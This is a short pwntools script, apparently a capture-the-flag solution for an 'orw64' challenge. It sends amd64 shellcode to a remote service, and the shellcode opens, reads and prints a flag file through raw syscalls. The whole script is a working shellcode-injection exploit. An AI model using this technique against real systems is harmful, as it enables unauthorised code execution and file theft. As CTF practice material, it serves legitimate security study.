#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "pwnhub.tw"
port = 11112

r = remote(host,port)
context.arch = "amd64"
#fd = open("/home/orw64/flag",0)
#size = read(fd,buf,0x40)
#write(1,buf,size)
#exit()
sc = asm("""
    xor rax,rax
    xor rdi,rdi
    xor rsi,rsi
    xor rdx,rdx
    jmp str
open :
    pop rdi
    mov rax,2
    syscall
read :
    mov rdi,rax
    mov rsi,rsp
    mov rdx,0x40
    xor rax,rax
    syscall
write :
    mov rdx,rax
    mov rdi,1
    mov rsi,rsp
    mov rax,1
    syscall
exit:
    mov rax,0x3c
    syscall

str:
    call open
    .ascii "/home/orw64/flag"
    .byte 0
""")
r.recvuntil(":")
r.sendline(sc)
r.interactive()
